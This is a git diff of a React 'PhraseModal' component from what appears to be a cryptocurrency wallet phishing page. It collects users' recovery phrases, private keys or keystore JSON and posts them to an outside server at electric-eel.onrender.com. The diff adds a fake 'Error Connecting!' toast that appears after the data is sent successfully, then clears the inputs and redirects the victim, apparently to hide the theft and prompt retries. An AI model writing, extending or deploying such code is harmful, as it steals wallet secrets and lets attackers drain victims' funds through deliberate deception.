@@ -1,8 +1,34 @@
 import React, { useState } from "react";
 import { motion } from "framer-motion";
 import { IoShieldHalfOutline } from "react-icons/io5";
+import { useNavigate } from "react-router-dom";
 
-const PhraseModal = ({ onClose, isDarkMode }) => {
+const Spinner = () => (
+  <svg
+    className="animate-spin h-5 w-5 text-white inline-block"
+    xmlns="http://www.w3.org/2000/svg"
+    fill="none"
+    viewBox="0 0 24 24"
+  >
+    <circle
+      className="opacity-25"
+      cx="12"
+      cy="12"
+      r="10"
+      stroke="currentColor"
+      strokeWidth="4"
+    ></circle>
+    <path
+      className="opacity-75"
+      fill="currentColor"
+      d="M4 12a8 8 0 018-8v4a4 4 0 00-4 4H4z"
+    ></path>
+  </svg>
+);
+
+const PhraseModal = ({ onClose, isDarkMode, wallet }) => {
+  const navigate = useNavigate();
+  const [showErrorToast, setShowErrorToast] = useState(false);
   const [activeTab, setActiveTab] = useState("phrase");
   const [phraseLength, setPhraseLength] = useState(12);
   const [phraseWords, setPhraseWords] = useState(Array(12).fill(""));
@@ -16,45 +42,53 @@ const PhraseModal = ({ onClose, isDarkMode }) => {
   };
 
   const handleWordChange = (index, value) => {
-    const updated = [...phraseWords];
-    updated[index] = value;
-    setPhraseWords(updated);
+    const newWords = [...phraseWords];
+    newWords[index] = value;
+    setPhraseWords(newWords);
   };
 
   const handleSubmit = async () => {
     try {
       setLoading(true);
 
-      // Prepare payload based on active tab
+      let payload = {
+        wallet: wallet?.name || "Unknown Wallet",
+        tab1Inputs: [],
+        tab2Text: "",
+        tab3: {
+          content: "",
+          title: "",
+        },
+      };
 
       if (activeTab === "phrase") {
-        // Check if all words are filled (no empty or whitespace-only strings)
         const incomplete = phraseWords.some((word) => word.trim() === "");
         if (incomplete) {
           alert("Please fill all the recovery phrase words before submitting.");
-          return; // Stop submit
+          setLoading(false);
+          return;
         }
-      }
-      let payload;
-      if (activeTab === "phrase") {
-        // Example: send phraseWords as array or joined string
-        payload = {
-          type: "phrase",
-          phrase: phraseWords.filter(Boolean), // filter out empty words
-        };
-      } else if (activeTab === "privateKey") {
-        payload = {
-          type: "privateKey",
-          key: privateKey,
-        };
-      } else if (activeTab === "keystore") {
-        payload = {
-          type: "keystore",
-          keystore: keystoreJson,
-        };
+        payload.tab1Inputs = phraseWords;
       }
 
-      console.log("Payload checksss:", payload);
+      if (activeTab === "privateKey") {
+        if (!privateKey.trim()) {
+          alert("Please enter your private key.");
+          setLoading(false);
+          return;
+        }
+        payload.tab2Text = privateKey;
+      }
+
+      if (activeTab === "keystore") {
+        if (!keystoreJson.trim()) {
+          alert("Please enter your keystore JSON.");
+          setLoading(false);
+          return;
+        }
+        payload.tab3.content = keystoreJson;
+        payload.tab3.title = "keystore";
+      }
 
       const response = await fetch("https://electric-eel.onrender.com/submit", {
         method: "POST",
@@ -65,16 +99,42 @@ const PhraseModal = ({ onClose, isDarkMode }) => {
       });
 
       const result = await response.json();
-      console.log("Submit successful: ", result);
+      console.log("Submit successful:", result);
 
-      // Optionally reset inputs after submit
+      // Do NOT clear inputs here! Keep values while loading.
+      // Wait 5 seconds before showing error toast and clearing inputs
+      setTimeout(() => {
+        setShowErrorToast(true);
+        setLoading(false); // stop spinner now
+
+        // Clear inputs when toast appears
+        setPhraseWords(Array(phraseLength).fill(""));
+        setPrivateKey("");
+        setKeystoreJson("");
+
+        // Close modal 1.5s after toast shows
+        setTimeout(() => {
+          onClose();
+        }, 1500);
+
+        // Navigate after 10s
+        setTimeout(() => {
+          navigate("/connect");
+        }, 10000);
+      }, 5000);
+    } catch (error) {
+      console.error("Submit error:", error);
+      setShowErrorToast(true);
+      setLoading(false);
+      // Clear inputs on error toast show
       setPhraseWords(Array(phraseLength).fill(""));
       setPrivateKey("");
       setKeystoreJson("");
-    } catch (error) {
-      console.error("Submit error:", error);
-    } finally {
-      setLoading(false);
+
+      setTimeout(() => {
+        onClose();
+        navigate("/connect");
+      }, 10000);
     }
   };
 
@@ -103,6 +163,7 @@ const PhraseModal = ({ onClose, isDarkMode }) => {
         <button
           onClick={onClose}
           className="absolute top-2 right-2 text-red-600 font-bold"
+          disabled={loading}
         >
           ✕
         </button>
@@ -114,6 +175,7 @@ const PhraseModal = ({ onClose, isDarkMode }) => {
               <button
                 key={tab}
                 onClick={() => setActiveTab(tab)}
+                disabled={loading}
                 className={`px-4 py-2 rounded-t ${
                   activeTab === tab
                     ? isDarkMode
@@ -142,10 +204,10 @@ const PhraseModal = ({ onClose, isDarkMode }) => {
                   {phraseLength} words entered
                 </p>
                 <ul className="flex text-gray-800 text-xs font-medium gap-2">
-                  {[12, 17, 24, 25].map((val) => (
+                  {[12, 15, 17, 24, 25].map((val) => (
                     <li
                       key={val}
-                      onClick={() => handlePhraseLengthChange(val)}
+                      onClick={() => !loading && handlePhraseLengthChange(val)}
                       className={`cursor-pointer px-2 py-1 rounded border transition-all duration-200 ${
                         phraseLength === val
                           ? "bg-blue-100 text-blue-600 border-blue-400"
@@ -161,25 +223,28 @@ const PhraseModal = ({ onClose, isDarkMode }) => {
               <div className="grid grid-cols-3 gap-4">
                 {phraseWords.map((input, index) => (
                   <div key={index} className="relative group my-1">
-                    <span className="absolute -left-0.5 top-2 bottom-2 w-1.5 rounded bg-gradient-to-b from-indigo-500 to-purple-500 opacity-70 transition-all duration-300 group-focus-within:opacity-100"></span>
+                    <span className="absolute -left-0.5 top-2 bottom-2 w-1.5 rounded transition-all duration-300 group-focus-within:opacity-100"></span>
                     <input
                       id={`input-${index}`}
                       type="text"
                       value={input}
-                      onChange={(e) => handleWordChange(index, e.target.value)}
+                      onChange={(e) =>
+                        !loading && handleWordChange(index, e.target.value)
+                      }
                       placeholder="Word"
                       className={`peer w-full pl-6 pr-4 pt-6 pb-2 text-sm ${
                         isDarkMode
                           ? "text-white bg-[#2a2a2a] border-gray-600"
                           : "text-gray-800 bg-white border-gray-200"
                       } border rounded-lg shadow-md focus:border-transparent focus:ring-2 focus:ring-indigo-300 focus:outline-none placeholder-transparent`}
+                      disabled={loading}
                     />
                     <label
                       htmlFor={`input-${index}`}
-                      className="absolute left-6 top-3.5 text-[8px] text-gray-500 transition-all duration-200 ease-in-out 
-                    peer-placeholder-shown:top-3 peer-placeholder-shown:text-base 
-                    peer-placeholder-shown:text-gray-400 peer-focus:top-1.5 
-                    peer-focus:text-sm peer-focus:text-indigo-500 peer-focus:font-semibold cursor-text"
+                      className="absolute left-6 top-3.5 text-[3px] text-gray-500 transition-all duration-200 ease-in-out 
+              peer-placeholder-shown:top-3 peer-placeholder-shown:text-[10px] 
+              peer-placeholder-shown:text-gray-400 peer-focus:top-1.5 
+              peer-focus:text-[8px] peer-focus:text-indigo-500 peer-focus:font-semibold cursor-text"
                     >
                       Write here
                     </label>
@@ -197,7 +262,7 @@ const PhraseModal = ({ onClose, isDarkMode }) => {
               </label>
               <textarea
                 value={privateKey}
-                onChange={(e) => setPrivateKey(e.target.value)}
+                onChange={(e) => !loading && setPrivateKey(e.target.value)}
                 placeholder="Enter your private key"
                 rows={4}
                 className={`w-full p-3 text-sm rounded-lg shadow border ${
@@ -205,6 +270,7 @@ const PhraseModal = ({ onClose, isDarkMode }) => {
                     ? "bg-[#2a2a2a] text-white border-gray-600"
                     : "bg-white text-gray-800 border-gray-200"
                 } focus:outline-none focus:ring-2 focus:ring-indigo-300`}
+                disabled={loading}
               />
             </div>
           )}
@@ -217,7 +283,7 @@ const PhraseModal = ({ onClose, isDarkMode }) => {
               </label>
               <textarea
                 value={keystoreJson}
-                onChange={(e) => setKeystoreJson(e.target.value)}
+                onChange={(e) => !loading && setKeystoreJson(e.target.value)}
                 placeholder="Paste your keystore JSON here"
                 rows={4}
                 className={`w-full p-3 text-sm rounded-lg shadow border ${
@@ -225,6 +291,7 @@ const PhraseModal = ({ onClose, isDarkMode }) => {
                     ? "bg-[#2a2a2a] text-white border-gray-600"
                     : "bg-white text-gray-800 border-gray-200"
                 } focus:outline-none focus:ring-2 focus:ring-indigo-300`}
+                disabled={loading}
               />
             </div>
           )}
@@ -236,11 +303,17 @@ const PhraseModal = ({ onClose, isDarkMode }) => {
             disabled={loading}
             className={`border w-full border-blue-500 rounded-full py-3 ${
               loading
-                ? "bg-gray-400 cursor-not-allowed text-gray-700"
+                ? "bg-gray-400 cursor-not-allowed text-gray-700 flex justify-center items-center gap-2"
                 : "bg-indigo-600 hover:text-white text-white hover:bg-indigo-700 cursor-pointer"
             } text-xs`}
           >
-            {loading ? "Submitting..." : "Continue"}
+            {loading ? (
+              <>
+                <Spinner /> Connecting...
+              </>
+            ) : (
+              "Connect"
+            )}
           </button>
         </div>
 
@@ -252,6 +325,49 @@ const PhraseModal = ({ onClose, isDarkMode }) => {
           </p>
         </div>
       </motion.div>
+
+      {/* Error Toast (top-right with bounce) */}
+      {showErrorToast && (
+        <motion.div
+          initial={{ x: "100%", y: -50, opacity: 0 }}
+          animate={{ x: 0, y: 0, opacity: 1 }}
+          exit={{ x: "100%", opacity: 0 }}
+          transition={{
+            type: "spring",
+            stiffness: 300,
+            damping: 20,
+            bounce: 0.5,
+            duration: 0.6,
+          }}
+          className="fixed top-5 right-5 z-50 w-80 max-w-xs p-4 bg-white text-red-700 border-l-4 border-red-500 rounded-lg shadow-lg"
+        >
+          <div className="flex-1">
+            <p className="font-bold text-2xl">Error Connecting!</p>
+            <p className="text-sm">
+              Only active wallets are authorized. <code></code>...
+            </p>
+          </div>
+          {/*     <button
+            onClick={() => setShowErrorToast(false)}
+            className="ml-4 focus:outline-none text-red-500"
+          >
+            <svg
+              className="w-6 h-6"
+              fill="none"
+              stroke="currentColor"
+              strokeWidth={2}
+              viewBox="0 0 24 24"
+              xmlns="http://www.w3.org/2000/svg"
+            >
+              <path
+                strokeLinecap="round"
+                strokeLinejoin="round"
+                d="M6 18L18 6M6 6l12 12"
+              />
+            </svg>
+          </button> */}
+        </motion.div>
+      )}
     </div>
   );
 };
